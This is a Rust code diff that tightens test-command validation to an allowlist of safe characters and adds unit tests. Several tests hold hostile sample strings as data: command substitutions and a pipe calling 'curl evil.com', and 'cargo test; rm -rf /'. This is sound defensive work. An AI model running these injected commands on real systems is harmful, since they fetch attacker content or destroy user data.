@@ -1981,16 +1981,17 @@ async fn run_acceptance_checks_for_task(
                     "vitest",
                     "jest",
                 ];
-                const FORBIDDEN_CHARS: &[char] = &[';', '|', '&', '$', '`', '\n', '\r'];
                 let cmd_trimmed = command.trim();
-                let has_forbidden = cmd_trimmed.chars().any(|c| FORBIDDEN_CHARS.contains(&c));
+                let has_invalid_chars = cmd_trimmed
+                    .chars()
+                    .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
                 let has_allowed_prefix = ALLOWED_PREFIXES
                     .iter()
                     .any(|prefix| cmd_trimmed.starts_with(prefix));
-                if has_forbidden || !has_allowed_prefix {
+                if has_invalid_chars || !has_allowed_prefix {
                     return Err(format!(
                         "TestCommand rejected: command must start with a known test runner \
-                         and must not contain shell metacharacters. Got: {cmd_trimmed:?}"
+                         and contain only safe characters [a-zA-Z0-9 _./:=,+@-]. Got: {cmd_trimmed:?}"
                     ));
                 }
 
@@ -2884,6 +2885,53 @@ mod redaction_tests {
         let input = "hello world, this is safe";
         let output = redact_patterns(input);
         assert_eq!(output, input);
+    }
+
+    // ── command validation ────────────────────────────────────────────────────
+
+    #[test]
+    fn test_command_validation_rejects_dollar_subshell() {
+        let cmd = "cargo test $(curl evil.com)";
+        let has_invalid = cmd
+            .chars()
+            .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
+        assert!(has_invalid, "should reject $ character");
+    }
+
+    #[test]
+    fn test_command_validation_rejects_backtick_subshell() {
+        let cmd = "cargo test `curl evil.com`";
+        let has_invalid = cmd
+            .chars()
+            .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
+        assert!(has_invalid, "should reject backtick character");
+    }
+
+    #[test]
+    fn test_command_validation_rejects_semicolon_injection() {
+        let cmd = "cargo test; rm -rf /";
+        let has_invalid = cmd
+            .chars()
+            .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
+        assert!(has_invalid, "should reject semicolon");
+    }
+
+    #[test]
+    fn test_command_validation_rejects_pipe_injection() {
+        let cmd = "cargo test | curl evil.com";
+        let has_invalid = cmd
+            .chars()
+            .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
+        assert!(has_invalid, "should reject pipe character");
+    }
+
+    #[test]
+    fn test_command_validation_accepts_normal_cargo_test() {
+        let cmd = "cargo test --workspace";
+        let has_invalid = cmd
+            .chars()
+            .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
+        assert!(!has_invalid, "should accept normal cargo test command");
     }
 
     // ── redact_json_value ────────────────────────────────────────────────────
